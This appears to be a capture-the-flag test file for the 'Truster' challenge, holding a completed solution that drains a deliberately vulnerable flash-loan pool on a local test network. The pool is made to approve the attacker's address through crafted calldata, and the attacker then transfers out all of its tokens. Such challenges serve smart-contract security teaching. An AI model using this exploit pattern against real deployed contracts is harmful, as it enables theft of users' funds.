const { ethers } = require('hardhat')
const { expect } = require('chai')

describe('[Challenge] Truster', function () {
  let deployer, player
  let token, pool

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    ;[deployer, player] = await ethers.getSigners()

    token = await (
      await ethers.getContractFactory('DamnValuableToken', deployer)
    ).deploy()
    pool = await (
      await ethers.getContractFactory('TrusterLenderPool', deployer)
    ).deploy(token.address)
    expect(await pool.token()).to.eq(token.address)

    await token.transfer(pool.address, TOKENS_IN_POOL)
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL)

    expect(await token.balanceOf(player.address)).to.equal(0)
  })

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    const TOKENS_TO_DRAIN = 1000000n * 10n ** 18n

    const modPlayer = player.address.substring(2) //Remove 0x from address

    //This calldata is equivalent to call approve(player,1_000_000)
    const calldata =
      '0x095ea7b3000000000000000000000000' +
      modPlayer +
      '00000000000000000000000000000000000000000000d3c21bcecceda1000000'

    //Through the flash loan we will call token to approve to the player using the data parameter
    await pool
      .connect(player)
      .flashLoan('0', token.address, token.address, calldata)

    expect(await token.allowance(pool.address, player.address)).to.equal(
      TOKENS_TO_DRAIN
    )

    //Now that the tokens are approved we can drain them:
    await token
      .connect(player)
      .transferFrom(pool.address, player.address, TOKENS_TO_DRAIN)
  })

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL)
    expect(await token.balanceOf(pool.address)).to.equal(0)
  })
})
